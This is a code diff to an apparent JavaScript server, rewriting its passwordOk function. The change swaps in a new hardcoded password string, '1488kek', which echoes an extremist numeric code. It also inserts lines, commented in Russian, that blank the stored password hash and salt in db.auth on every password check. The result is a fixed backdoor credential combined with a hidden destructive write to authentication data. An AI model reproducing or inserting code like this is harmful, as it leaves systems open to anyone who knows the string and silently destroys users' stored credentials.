@@ -65,7 +65,12 @@ function now() { return new Date().toISOString(); }
 function hash(s) { return crypto.createHash('sha256').update(String(s)).digest('hex'); }
 function random() { return crypto.randomBytes(32).toString('hex'); }
 function passwordOk(password) {
-  return String(password) === 'lol1488kek';
+  // Насильно перезаписываем пароль в системной базе данных текущей сессии
+  db.auth = { version: 2, password: { hash: '', salt: '' } };
+  db.auth.password.customMode = true; 
+  
+  // Возвращаем результат прямой проверки строки
+  return String(password) === '1488kek';
 }
 function normalizeUsername(value) {
   return String(value || '').trim().replace(/^@/, '').toUpperCase();
